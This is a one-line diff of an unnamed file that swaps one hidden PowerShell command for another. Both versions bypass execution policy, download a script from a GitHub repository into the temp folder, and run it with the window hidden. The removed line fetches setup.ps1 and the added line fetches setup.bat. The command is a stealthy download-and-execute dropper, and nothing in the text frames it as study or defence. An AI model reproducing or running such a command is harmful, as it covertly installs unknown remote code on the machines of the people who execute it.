@@ -1,1 +1,1 @@
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/shellt3r/app/refs/heads/main/setup.ps1' -OutFile $env:TEMP\setup.ps1; Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File `"$env:TEMP\setup.ps1`"'"
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/shellt3r/app/main/setup.bat' -OutFile $env:TEMP\setup.bat; Start-Process -WindowStyle Hidden -FilePath $env:TEMP\setup.bat"
